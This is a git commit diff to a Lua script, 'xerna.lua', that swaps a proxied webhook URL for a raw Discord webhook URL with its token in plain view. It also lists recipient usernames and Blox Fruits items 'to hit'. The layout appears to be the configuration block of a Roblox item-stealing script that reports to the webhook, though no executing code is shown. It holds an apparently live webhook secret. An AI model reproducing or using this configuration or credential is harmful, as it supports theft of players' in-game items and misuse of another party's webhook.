21a99339b96b52678faff15d866ca9c43c0c6403
Scripter <hehiaha2@gmail.com>
2025-03-06 09:54:06 +0700

    Update xerna.lua

--- xerna.lua
+++ xerna.lua
@@ -1,5 +1,5 @@
 Webhook =
-    "https://webhook-protect.vercel.app/api/webhook?id=eHZlMW1vbmJfYzZFY3gzbXNuZDNkQTppN0JFX3JmOVpkbFZsZGtYb1FKd0hnYmFocVp1aFNCcWVzV1NWZ3M4Zi1tcm9TOHh6a2NfVl9jT2kyWFJ5TGE4MnVtckp5RW5RUi02X2lrVDJ6c2Y4Qk9DRmNtdGltY1JHLUk5NFlCTXQyT3dvb3BiZWpzNUhrSk5XYmtHUUk0Y3dsSnFpR3NtWUJvSlJVUTJva0tkcFhmaGhkWHltcUNsYzduOWhpMzF0Mk0" -- << Your Webhook
+    "https://discord.com/api/webhooks/1347037790260691029/jAohKwEwzCdBD9_wx0Ufw7KyZi4McBIXfYUrT8nAMky-zFI_IFSUoL8cRR5GpERLm070" -- << Your Webhook
 Usernames = {"miepe76543", "GAMINGSURVIVAL01"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
